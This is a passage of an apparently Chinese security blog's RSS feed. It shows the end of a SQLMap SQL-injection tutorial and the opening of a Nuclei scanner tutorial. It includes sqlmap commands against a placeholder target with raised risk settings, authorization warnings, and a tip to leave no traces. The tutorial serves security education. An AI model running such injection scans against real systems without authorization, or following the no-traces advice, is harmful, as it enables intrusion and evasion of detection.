+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; --risk&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="c1"&gt;# 详细输出&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sqlmap -u &lt;span class="s2"&gt;&amp;#34;http://target.com/page?id=1&amp;#34;&lt;/span&gt; -v &lt;span class="m"&gt;3&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;h2 id="注意事项"&gt;注意事项
+&lt;/h2&gt;&lt;h3 id="-法律风险"&gt;⚠️ 法律风险
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;❌ 仅用于授权测试&lt;/li&gt;
+&lt;li&gt;❌ 不要测试未授权目标&lt;/li&gt;
+&lt;li&gt;❌ 不要用于非法目的&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3 id="-技术风险"&gt;⚠️ 技术风险
+&lt;/h3&gt;&lt;ul&gt;
+&lt;li&gt;⚠️ 可能触发 WAF 报警&lt;/li&gt;
+&lt;li&gt;⚠️ 可能导致服务中断&lt;/li&gt;
+&lt;li&gt;⚠️ 可能留下日志痕迹&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;h2 id="总结"&gt;总结
+&lt;/h2&gt;&lt;p&gt;SQLMap 是强大的 SQL 注入工具，建议：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;&lt;strong&gt;合法使用&lt;/strong&gt; - 仅用于授权测试&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;理解原理&lt;/strong&gt; - 不要只会用工具&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;手动验证&lt;/strong&gt; - 工具结果要手动验证&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;注意安全&lt;/strong&gt; - 不要留下痕迹&lt;/li&gt;
+&lt;/ol&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;strong&gt;参考资料：&lt;/strong&gt;&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a class="link" href="https://github.com/sqlmapproject/sqlmap" target="_blank" rel="noopener"
+ &gt;https://github.com/sqlmapproject/sqlmap&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class="link" href="http://sqlmap.org/" target="_blank" rel="noopener"
+ &gt;http://sqlmap.org/&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;&lt;a class="link" href="https://sqlmap.org/faq/" target="_blank" rel="noopener"
+ &gt;https://sqlmap.org/faq/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;hr&gt;
+&lt;p&gt;&lt;em&gt;本文仅用于安全研究与教育目的，请勿用于非法用途。&lt;/em&gt;&lt;/p&gt;</description></item><item><title>Nuclei 漏洞扫描器从入门到精通</title><link>https://blog.caowo.de/posts/nuclei-tutorial/</link><pubDate>Sun, 01 Mar 2026 15:00:00 +0800</pubDate><guid>https://blog.caowo.de/posts/nuclei-tutorial/</guid><description>&lt;h1 id="nuclei-漏洞扫描器从入门到精通"&gt;Nuclei 漏洞扫描器从入门到精通
 &lt;/h1&gt;
  &lt;blockquote&gt;
  &lt;p&gt;&lt;strong&gt;工具名称：&lt;/strong&gt; Nuclei&lt;br&gt;
